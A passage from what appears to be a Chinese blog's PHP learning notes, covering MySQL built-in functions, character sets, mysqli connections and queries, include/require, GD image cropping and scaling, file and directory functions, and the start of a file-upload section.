punctuation">)</span>去掉字符串str左侧的空格  RTRIM<span class="token punctuation">(</span>str<span class="token punctuation">)</span>去掉字符串str行尾的空格  REPEAT<span class="token punctuation">(</span>str,x<span class="token punctuation">)</span>返回str重复x次的结果  REPLACE<span class="token punctuation">(</span>str,a,b<span class="token punctuation">)</span>用字符串b替换字符串str中所有出现的字符串a  STRCMP<span class="token punctuation">(</span>s1,s2<span class="token punctuation">)</span>比较字符串s1和s2  TRIM<span class="token punctuation">(</span>str<span class="token punctuation">)</span>去掉字符串行尾和行头的空格  SUBSTRING<span class="token punctuation">(</span>str,x,y<span class="token punctuation">)</span>返回从字符串str x位置起y个字符长度的字符串  LENGTH<span class="token punctuation">(</span>str<span class="token punctuation">)</span>返回字符串长度</code></pre><ol start="2"><li>数值函数</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">ABS<span class="token punctuation">(</span>x<span class="token punctuation">)</span>返回x的绝对值  CEIL<span class="token punctuation">(</span>x<span class="token punctuation">)</span>返回大于x的最小整数值  FLOOR<span class="token punctuation">(</span>x<span class="token punctuation">)</span>返回小于x的最大整数值  MOD<span class="token punctuation">(</span>x,y<span class="token punctuation">)</span>返回x/y的模  RAND<span class="token punctuation">(</span><span class="token punctuation">)</span>返回0-1内的随机值  ROUND<span class="token punctuation">(</span>x,y<span class="token punctuation">)</span>返回参数x的四舍五入的有y位小数的值  TRUNCATE<span class="token punctuation">(</span>x,y<span class="token punctuation">)</span>返回数字x截断为y位小数的结果</code></pre><ol start="3"><li>日期和时间函数</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">CURDATE<span class="token punctuation">(</span><span class="token punctuation">)</span>返回当前日期  CURTIME<span class="token punctuation">(</span><span class="token punctuation">)</span>返回当前时间  NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>返回当前的日期和时间  UNIX_TIMESTAMP<span class="token punctuation">(</span>date<span class="token punctuation">)</span>返回日期date的UNIX时间戳  FROM_UNIXTIME<span class="token punctuation">(</span><span class="token punctuation">)</span>返回UNIX时间戳的日期值  WEEK<span class="token punctuation">(</span>date<span class="token punctuation">)</span>返回日期date为一年中的第几周  YEAR<span class="token punctuation">(</span>date<span class="token punctuation">)</span>返回日期date的年份  HOUR<span class="token punctuation">(</span>time<span class="token punctuation">)</span>返回time的小时值  MINUTE<span class="token punctuation">(</span>time<span class="token punctuation">)</span>返回time的分钟值  MONTHNAME<span class="token punctuation">(</span>date<span class="token punctuation">)</span>返回date的月份名  DATE_FORMAT<span class="token punctuation">(</span>date,fmt<span class="token punctuation">)</span>返回按字符串fmt格式化日期date值  DATE_ADD<span class="token punctuation">(</span>add,INTERVAL <span class="token function">expr</span> <span class="token builtin class-name">type</span><span class="token punctuation">)</span> 返回一个日期或时间值加上一个时间间隔的时间值  DATEDIFF<span class="token punctuation">(</span>expr,expr2<span class="token punctuation">)</span>返回起始时间expr和结束时间expr2之间的天数</code></pre><ol start="4"><li>流程函数</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span><span class="token punctuation">)</span>IF<span class="token punctuation">(</span>value,t,f<span class="token punctuation">)</span>如果value是真，返回t,否则返回f<span class="token keyword">select</span> if<span class="token punctuation">(</span>field<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token number">1000</span>,<span class="token string">'满分'</span>,<span class="token string">'零蛋'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">)</span>IFNULL<span class="token punctuation">(</span>value1,value2<span class="token punctuation">)</span>如果value1不为null，返回value1，否则value1该是什么还是什么<span class="token keyword">select</span> ifnull<span class="token punctuation">(</span>name,<span class="token string">'假名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">)</span>CASE WHEN <span class="token punctuation">[</span>value1<span class="token punctuation">]</span> THEN <span class="token punctuation">[</span>result1<span class="token punctuation">]</span><span class="token punctuation">..</span>.ELSE<span class="token punctuation">[</span>default<span class="token punctuation">]</span>END如果value1是真，返回result1，否则返回default<span class="token keyword">select</span> <span class="token keyword">case</span> when <span class="token number">10</span><span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token number">10</span> <span class="token keyword">then</span> <span class="token string">'真'</span> <span class="token keyword">else</span> <span class="token string">'假'</span> end<span class="token punctuation">;</span>和if语句比较像<span class="token number">4</span><span class="token punctuation">)</span>CASE <span class="token punctuation">[</span>expr<span class="token punctuation">]</span> WHEN <span class="token punctuation">[</span>value1<span class="token punctuation">]</span> THEN<span class="token punctuation">[</span>result1<span class="token punctuation">]</span><span class="token punctuation">..</span>.ELSE<span class="token punctuation">[</span>default<span class="token punctuation">]</span>END  如果expr等于value1，返回result1，否则返回default<span class="token keyword">select</span> <span class="token keyword">case</span> <span class="token number">1</span> when <span class="token number">1</span> <span class="token keyword">then</span> <span class="token string">'一'</span> when <span class="token number">2</span> <span class="token keyword">then</span> <span class="token string">'二'</span> when <span class="token number">3</span> <span class="token keyword">then</span> <span class="token string">'三'</span> <span class="token keyword">else</span> <span class="token string">'未知数字'</span>end<span class="token punctuation">;</span>和switch语句比较像</code></pre><ol start="5"><li>其他常用函数</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">DATABASE<span class="token punctuation">(</span><span class="token punctuation">)</span>返回当前数据库名VERSION<span class="token punctuation">(</span><span class="token punctuation">)</span>返回当前数据库版本<span class="token environment constant">USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span>返回当前登录用户名INET_ATON<span class="token punctuation">(</span>IP<span class="token punctuation">)</span>返回IP地址的数字表示INET_NTOA<span class="token punctuation">(</span>num<span class="token punctuation">)</span>返回数字代表的IP地址PASSWORD<span class="token punctuation">(</span>str<span class="token punctuation">)</span>返回字符串str的加密版本MD5<span class="token punctuation">(</span><span class="token punctuation">)</span>返回字符串str的MD5值</code></pre><h2 id="知识补充：数据库字符编码"><a href="#知识补充：数据库字符编码" class="headerlink" title="知识补充：数据库字符编码"></a>知识补充：数据库字符编码</h2><h3 id="一、MySQL支持的字符集"><a href="#一、MySQL支持的字符集" class="headerlink" title="一、MySQL支持的字符集"></a>一、MySQL支持的字符集</h3><p>1.查看所有可用的字符集</p><pre class="language-bash" data-language="bash"><code class="language-bash">show character <span class="token builtin class-name">set</span><span class="token punctuation">;</span>或者查看information_schema.character_sets，也可以显示所有的字符集和该字符集默认的校队规则</code></pre><p>2.MySQL的字符集包括字符集(character)和校对规则(collation)两个概念。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span><span class="token punctuation">)</span>字符集用来定义MySQL存储字符串的方式<span class="token number">2</span><span class="token punctuation">)</span>校对规则用来定义 字符串比较的方式<span class="token number">3</span><span class="token punctuation">)</span>字符集和校对规则是一对多的关系,一个字符集有多个校对规则供你选择<span class="token operator">!</span>  校对规则命名约定：它们以相关的字符集名开始，通常包括一个语言名，并且以  _ci<span class="token punctuation">(</span>忽略大小写<span class="token punctuation">)</span>、  _cs<span class="token punctuation">(</span>大小写敏感<span class="token punctuation">)</span>或者  _bin<span class="token punctuation">(</span>二元，即比较是基于字符编码的值而与language无关<span class="token punctuation">)</span>结束。查看字符集的校对规则：show  collation like <span class="token string">'字符集前缀%'</span><span class="token punctuation">;</span></code></pre><h3 id="二、MySQL内部的字符集和校对规则设置"><a href="#二、MySQL内部的字符集和校对规则设置" class="headerlink" title="二、MySQL内部的字符集和校对规则设置"></a>二、MySQL内部的字符集和校对规则设置</h3><ol><li>数据库字符集和校对规则设置</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">CREATE DATABASE db_name<span class="token punctuation">[</span><span class="token punctuation">[</span>DEFAULT<span class="token punctuation">]</span> CHARACTER SET charset_name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span>DEFAULT<span class="token punctuation">]</span> COLLATE collation_name<span class="token punctuation">]</span>查看当前数据库的字符集和校对规则：show variables like <span class="token string">'character_set_database'</span><span class="token punctuation">;</span>show variables like <span class="token string">'collation_database'</span><span class="token punctuation">;</span>ALTER DATABASE db_name<span class="token punctuation">[</span><span class="token punctuation">[</span>DEFAULT<span class="token punctuation">]</span> CHARACTER SET charset_name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span>DEFAULT<span class="token punctuation">]</span> COLLATE collation_name<span class="token punctuation">]</span></code></pre><ol start="2"><li>表字符集和校对规则设置</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">CREATE TABLE tbl_name <span class="token punctuation">(</span>column_list<span class="token punctuation">)</span><span class="token punctuation">[</span>DEFAULT CHARACTER SET charset_name <span class="token punctuation">[</span>COLLATE collation_name<span class="token punctuation">]</span><span class="token punctuation">]</span> ALTER TABLE tbl_name<span class="token punctuation">[</span>DEFAULT CHARACTER SET charset_name<span class="token punctuation">]</span> <span class="token punctuation">[</span>COLLATE collation_name<span class="token punctuation">]</span></code></pre><p>连接字符集设置：客户端和服务器之间交互的字符集</p><h1 id="在PHP中使用mysql与mysqli交互"><a href="#在PHP中使用mysql与mysqli交互" class="headerlink" title="在PHP中使用mysql与mysqli交互"></a>在PHP中使用mysql与mysqli交互</h1><h2 id="一、使用mysqli"><a href="#一、使用mysqli" class="headerlink" title="一、使用mysqli"></a>一、使用mysqli</h2><p>在PHP中可以使用mysqli扩展与mysql数据库进行信息交流，i表示改进，增强，它执行速度更快，是一种面向对象的技术。</p><ol><li>建立、关闭与MySQL服务器的连接<br>①：连接指定的MySQL服务器<pre class="language-mysql" data-language="mysql"><code class="language-mysql">$mysql_connect&#x3D;@mysqli_connect($host,$user,$password,$database,$port);</code></pre>默认端口3306，可不填。<br>②：连接错误时提示<br>③：设置默认字符编码<br>④：选择特定的数据库<br>⑤：关闭与mysql服务器的连接<br>下面一个栗子：</li></ol><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$link</span><span class="token operator">=</span>@<span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_set_charset</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置默认字符编码</span><span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//选择特定的数据库</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭与mysql服务器的连接</span><span class="token delimiter important">?></span></span></code></pre><p>跑一下，如果没有报错，就是连接成功了。</p><h2 id="二、执行SQL语句"><a href="#二、执行SQL语句" class="headerlink" title="二、执行SQL语句"></a>二、执行SQL语句</h2><ol><li>对数据库执行一条SQL语句</li></ol><pre class="language-php" data-language="php"><code class="language-php">mixed mysqli_query <span class="token punctuation">(</span> mysqli <span class="token variable">$link</span> <span class="token punctuation">,</span> string <span class="token variable">$query</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token variable">$resultmode</span> <span class="token operator">=</span> <span class="token constant">MYSQLI_STORE_RESULT</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>①对于insert，update，delete等不会返回数据的SQL语句，在执行没有错误时将返回true。<br>②对于返回数据的SQL语句执行成功的时候会返回结果集对象可以使用操作结果集对象的函数来从中获取数据</p><ol start="2"><li><p>操作结果集对象的函数<br>从结果集对象中解析数据的常见函数<br>①以索引数组的方式获取一条记录的数据<br> <code>mixed mysqli_fetch_row ( mysqli_result $result );</code></p><pre><code>                    重复使用以获取下一条记录的数据</code></pre><p>②以关联数组的方式获取一条记录的数据</p><pre><code>                    `array mysqli_fetch_assoc ( mysqli_result $result );`                    重复使用以获取下一条记录的数据      ③以索引数组或关联数组的方式获取一条记录的数据                 `   mixed mysqli_fetch_array ( mysqli_result $result [, int $resulttype = MYSQLI_BOTH ] );`                    重复使用以获取下一条记录的数据      ④以索引数组或关联数组的方式获取全部记录的数据                   ` mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] );`      ⑤返回结果集中的下一个字段信息             `       object mysqli_fetch_field ( mysqli_result $result );`      ⑥返回一个代表结果集字段的对象数组                 `   array mysqli_fetch_fields ( mysqli_result $result );`      ⑦获取结果中行的数量                 `   int mysqli_num_rows ( mysqli_result $result );`                    注意：如果使用MYSQLI_USE_RESULT模式则必须在获取完结果集才可使用该函数。</code></pre></li><li><p>释放与一个结果集相关的内存<br>返回的结果集在数据量很大的时候需要很多的内存支持，所以在操作完结果集的时候有必要立刻释放与一个结果集相关的内</p><pre><code>      存， 释放之后，结果集就不可用了      `void mysqli_free_result ( mysqli_result $result );`</code></pre><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1></li><li><p>include语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/login.php'</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'login.php'</span><span class="token punctuation">;</span><span class="token comment">//include后面接上一个空格然后接上一个字符串，字符串里面是要包含进来并执行的一个php文件的路径</span><span class="token delimiter important">?></span></span></code></pre><p>这个就好像是C++中分开写代码那样(跟继承差不多)，可以用<code>#include &quot;xxxx.h&quot;</code>来使用这个类。相当于原本一个代码将它拆分成两个，逻辑更加清晰。(实际上还是一个代码。)</p></li><li><p>include_once语句<br>如果文件被包含，则不会再次包含，可以用在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保文件只被包含一次以避免函数重定义，变量赋值等问题。</p></li><li><p>require语句<br>和include语句差不多，处理失败的方式不同，include是出错了还会接着执行，但是require语句是出错了就会停止执行。</p></li><li><p>require_once语句<br>与require语句基本相同，唯一区别就是php会检查这个文件是否已经被包含过了，如果包含过，那么就不会再次包含。</p></li></ol><p>终于到此结束，但是感觉这是边学边忘，这样肯定不行，接下来找时间学习开发小论坛，最起码不能学了跟没有学一样吧，如果这样就是在浪费时间。</p><p>文末寄语：</p><blockquote><p>一个远行的人要寻找什么呢？可能他自己也不知道，他只是寻找，张望，直到最后，寻找成了他的命运。就像我在你身上，寻找我的命运，那不能把握没法参透的一部分，就是我们的真爱。                                                                                         ——    田艺苗《旅人》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(3)</title>
      <link href="/posts/ab0c764f/"/>
      <url>/posts/ab0c764f/</url>
      
        <content type="html"><![CDATA[<h1 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h1><h2 id="裁剪与缩放"><a href="#裁剪与缩放" class="headerlink" title="裁剪与缩放"></a>裁剪与缩放</h2><p>裁剪：<br>利用<code>imagecopyresampled()</code>函数，<br><code>imagecopyresampled(dst_image, src_image, dst_x, dst_y, src_x, src_y, dst_w, dst_h, src_w, src_h)</code><br>函数参数说明：<br>dst_image：目标图象<br>src_image：源图像资源（要采集的那个图像资源）<br>dst_x, dst_y：确定一个坐标，把采样到的部分，放到目标图像资源的什么位置。<br>src_x, src_y：确定一个坐标，确定一个坐标，（是要采样的原图像资源的某个部分的起始坐标）<br>dst_w, dst_h：确定放在目标图象资源上的尺寸<br>src_w, src_h：确定了裁剪部分的尺寸。</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpheader(&#39;Content-type:image&#x2F;jpeg&#39;);$img&#x3D;imagecreatefromjpeg(&#39;images&#x2F;2.jpg&#39;);$img1&#x3D;imagecreatetruecolor(300, 300);imagecopyresampled($img1, $img, 100, 100, 0, 0, 200, 200, 200, 200);imagejpeg($img1);imagedestroy($img1);&#x2F;&#x2F;两个都要销毁。imagedestroy($img);?&gt;</code></pre><p>缩放：<br>demo示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$width</span><span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">;</span><span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'images/2.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$imgWidth</span><span class="token operator">=</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//得到源图像（需要缩小的图片）的x轴坐标</span><span class="token variable">$imgHeight</span><span class="token operator">=</span><span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//得到源图像（需要缩小的图片）的y轴坐标</span><span class="token variable">$height</span><span class="token operator">=</span><span class="token variable">$width</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token variable">$imgWidth</span><span class="token operator">/</span><span class="token variable">$imgHeight</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//确定放到目标图象上的尺寸，这里是全部放上去。所以是整个图片的尺寸</span><span class="token variable">$img1</span><span class="token operator">=</span><span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>创建一个与源图像尺寸相同的图像。<span class="token function">imagecopyresampled</span><span class="token punctuation">(</span><span class="token variable">$img1</span><span class="token punctuation">,</span> <span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">,</span> <span class="token variable">$imgWidth</span><span class="token punctuation">,</span> <span class="token variable">$imgHeight</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$img1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>上面为缩小示例，等比例缩放，不仅是尺寸缩小了，而且它的图片所占空间（大小）也变小了。则用HTML的CSS进行缩小的时候，他的所占空间大小是不会变的，而且画质可能会有变化。</p><h1 id="文件与目录操作"><a href="#文件与目录操作" class="headerlink" title="文件与目录操作"></a>文件与目录操作</h1><p>PHP可以在服务器上生成目录、创建、编辑、删除、修改文件属性等操作</p><h2 id="判断普通文件和目录"><a href="#判断普通文件和目录" class="headerlink" title="判断普通文件和目录"></a>判断普通文件和目录</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token number">1.</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//判断给定文件名是否为一个正常的文件</span><span class="token number">2.</span> <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//判断给定文件名是否为一个目录</span></code></pre><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token number">1.</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//检查文件或目录是否存在(返回true或false)</span><span class="token number">2.</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//取得普通文件大小(单位是字节)//参数放文件名或文件路径</span><span class="token number">3.</span> <span class="token function">is_readable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//判断给定的文件是否可读</span><span class="token number">4.</span> <span class="token function">is_writeable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//判断给定文件是否可写</span><span class="token number">5.</span> <span class="token function">filectime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//获取文件的创建时间</span><span class="token number">6.</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//获取文件的修改时间</span><span class="token number">7.</span> <span class="token function">fileatime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//获取文件的上次访问时间</span><span class="token number">8.</span> <span class="token function">stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//获取文件大部分属性值</span></code></pre><h2 id="目录的基本操作"><a href="#目录的基本操作" class="headerlink" title="目录的基本操作"></a>目录的基本操作</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token number">1.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//返回路径中的文件名部分</span><span class="token number">2.</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//返回路径中的目录部分</span><span class="token number">3.</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//返回文件路径的信息</span><span class="token number">4.</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//打开目录句柄</span><span class="token number">5.</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//从目录句柄中读取条目，返回目录中下一个文件的文件名</span><span class="token number">6.</span> <span class="token function">rewinddir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//倒回目录句柄</span><span class="token number">7.</span> <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//关闭目录句柄</span><span class="token number">8.</span> <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//新建目录</span><span class="token number">9.</span> <span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//删除指定的空目录</span><span class="token number">10.</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//列出指定路径中的文件和目录</span></code></pre><h2 id="文件的基本操作"><a href="#文件的基本操作" class="headerlink" title="文件的基本操作"></a>文件的基本操作</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token number">1.</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//打开文件或者URL</span><span class="token number">2.</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//读取文件</span><span class="token number">3.</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//从文件指针中读取一行</span><span class="token number">4.</span> <span class="token function">feof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//测试文件指针是否到了文件结束的位置</span><span class="token number">5.</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//写入文件   返回值为写入的字节数</span><span class="token number">6.</span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//倒回文件指针的位置</span><span class="token number">7.</span> <span class="token function">flock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//轻便的咨询文件锁定</span><span class="token number">8.</span> <span class="token function">ftruncate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//将文件截断到给定的长度</span><span class="token number">9.</span> <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//关闭一个已打开的文件指针</span><span class="token number">10.</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//将整个文件读入一个数组中</span><span class="token number">11.</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//拷贝文件</span><span class="token number">12.</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//删除文件</span><span class="token number">13.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//将整个文件读入一个字符串</span><span class="token number">14.</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//将字符串写入文件中</span><span class="token number">15.</span> <span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//重命名一个文件或目录</span><span class="token number">16.</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 读入一个文件并写入到输出缓冲</span><span class="token number">17.</span> <span class="token function">fseek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//在文件指针中定位</span></code></pre><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文见上传的过程是自动的，不需要管。上传的文件默认是放在一个临时的目录里面的，要做的就是把临时目录里的文件移动到需要它的地方就可以了。</p><p>1.html标签需要做的上传设置</p><blockquote><p>form标签属性设置</p><ul><li><p>method设置为post</p></li><li><p>enctype设置为multipart/form-data</p></li><li><p>form表单中设置隐藏类型的input其中name值设置为MAX_FILE_SIZE,value值设置为需要限制的上传文件的大小</p></li></ul></blockquote><p>2.在服务器端通过PHP处理上传文件，设计以下几条信息</p><p>在phpstudy中的设置路径：<code>D:\phpStudy\PHPTutorial\php\php-5.4.45-nts</code></p><blockquote><p>配置项                                可能值                         功能描述<br>file_uploads                      On                     确定服务器上的PHP脚本是否可以接受http文件上传<br>memory_limit                  128M                 设置脚本可以分配的最大内存量，防止失控的脚本独占服务器内存<br>upload_max_filesize       2M                     限制PHP处理上传文件的最大值，此值必须小于post_max_size的值<br>post_max_size                 8M                     限制通过POST方法可以接受的信息最大量<br>upload_tmp_dir            没有设定，自己设置一下         文件上传存放的临时路径，可以是一个绝对路径，这个目录对于拥有此服务器进程用户必须是可写的。</p></blockquote><p><code>$_FILES</code>多维数组，用于存储各种与上传有关的信息</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span>客户端机器文件的原名称，包含扩展名<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span>已上传文件的大小，单位为字节<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span>文件上传之后，在服务器端存储的临时文件<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span>文件上传时产生的错误    <span class="token number">0</span>：表示没有发生任何错误，文件上传成功    <span class="token number">1</span>：表示上传文件的大小超出在<span class="token constant">PHP</span>配置文件中upload_max_filesize选项限制的值    <span class="token number">2</span>：表示上传文件大小超出了<span class="token constant">HTML</span>表单中<span class="token constant">MAX_FILE_SIZE</span>选项所指定的值。    <span class="token number">3</span>：表示文件只被部分上传    <span class="token number">4</span>：表示没有上传任何文件<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span>获取客户端上传文件的<span class="token constant">MIME</span>类型，<span class="token constant">MIME</span>类型规定了各种文件格式的类型，每种<span class="token constant">MIME</span>类型都是由<span class="token operator">/</span>分隔的主类型和子类型组成</code></pre><p>PHP的文见上传处理函数，用于上传文件的后续处理</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>判断指定的文件是否通过http post上传的<span class="token function">move_uploaded_file</span><span class="token 